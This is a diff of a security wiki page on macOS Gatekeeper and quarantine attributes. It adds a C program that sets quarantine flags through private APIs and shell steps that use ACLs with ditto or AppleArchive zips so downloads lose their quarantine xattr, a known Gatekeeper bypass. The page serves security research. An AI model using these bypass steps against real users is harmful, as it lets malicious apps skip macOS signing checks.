@@ -116,6 +116,12 @@ cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
 
 These are hashes that come from **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** and **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**
 
+Or you could list the previous info with:
+
+```bash
+sudo spctl --list
+```
+
 The options **`--master-disable`** and **`--global-disable`** of **`spctl`** will completely **disable** these signature checks:
 
 ```bash
@@ -148,7 +154,7 @@ source=no usable signature
 
 # Add a label and allow this label in GateKeeper
 sudo spctl --add --label "whitelist" /Applications/App.app
-sudo spctl --enable --label "whitelist"                      
+sudo spctl --enable --label "whitelist"
 
 # Check again - yep
 spctl --assess -v /Applications/App.app            
@@ -206,11 +212,79 @@ com.apple.macl:
 00000040  00 00 00 00 00 00 00 00                          |........|
 00000048
 com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
-# 00c1 -- It has been allowed to eexcute this file
+# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
 # 607842eb -- Timestamp
 # Brave -- App
 # F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
 ```
+
+Actually a process "could set quarantine flags to the files it creates" (i tried to apply the USER\_APPROVED flag in a created file but it won't apply it):
+
+<details>
+
+<summary>Source Code apply quarantine flags</summary>
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+enum qtn_flags {
+    QTN_FLAG_DOWNLOAD = 0x0001,
+    QTN_FLAG_SANDBOX = 0x0002,
+    QTN_FLAG_HARD = 0x0004,
+    QTN_FLAG_USER_APPROVED = 0x0040,
+};
+
+#define qtn_proc_alloc _qtn_proc_alloc
+#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
+#define qtn_proc_free _qtn_proc_free
+#define qtn_proc_init _qtn_proc_init
+#define qtn_proc_init_with_self _qtn_proc_init_with_self
+#define qtn_proc_set_flags _qtn_proc_set_flags
+#define qtn_file_alloc _qtn_file_alloc
+#define qtn_file_init_with_path _qtn_file_init_with_path
+#define qtn_file_free _qtn_file_free
+#define qtn_file_apply_to_path _qtn_file_apply_to_path
+#define qtn_file_set_flags _qtn_file_set_flags
+#define qtn_file_get_flags _qtn_file_get_flags
+#define qtn_proc_set_identifier _qtn_proc_set_identifier
+
+typedef struct _qtn_proc *qtn_proc_t;
+typedef struct _qtn_file *qtn_file_t;
+
+int qtn_proc_apply_to_self(qtn_proc_t);
+void qtn_proc_init(qtn_proc_t);
+int qtn_proc_init_with_self(qtn_proc_t);
+int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
+qtn_proc_t qtn_proc_alloc();
+void qtn_proc_free(qtn_proc_t);
+qtn_file_t qtn_file_alloc(void);
+void qtn_file_free(qtn_file_t qf);
+int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
+uint32_t qtn_file_get_flags(qtn_file_t qf);
+int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
+int qtn_file_init_with_path(qtn_file_t qf, const char *path);
+int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);
+
+int main() {
+
+  qtn_proc_t qp = qtn_proc_alloc();
+  qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
+  qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
+  qtn_proc_apply_to_self(qp);
+  qtn_proc_free(qp);
+
+  FILE *fp;
+  fp = fopen("thisisquarantined.txt", "w+");
+  fprintf(fp, "Hello Quarantine\n");
+  fclose(fp);
+
+  return 0;
+  
+}
+```
+
+</details>
 
 And **remove** that attribute with:
 
@@ -310,18 +384,29 @@ xattr -w attrname vale /tmp/no-attr
 xattr: [Errno 13] Permission denied: '/tmp/no-attr'
 ```
 
-Moreover, **AppleDouble** file format  copies a file including its ACEs.
+Moreover, **AppleDouble** file format copies a file including its ACEs.
 
 In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`**  is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
 
+{% code overflow="wrap" %}
 ```bash
 chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
 ditto -c -k test test.zip
 python3 -m http.server
-# Download the zip from the browser and decompress it, the file shuold be without a wuarantine xattr
+# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
 ```
+{% endcode %}
 
 Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.
+
+Note that this could also be be exploited with AppleArchives:
+
+```bash
+mkdir app
+touch app/test
+chmod +a "everyone deny write,writeattr,writeextattr" app/test
+aa archive -d app -o test.aar
+```
 
 ### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)
 
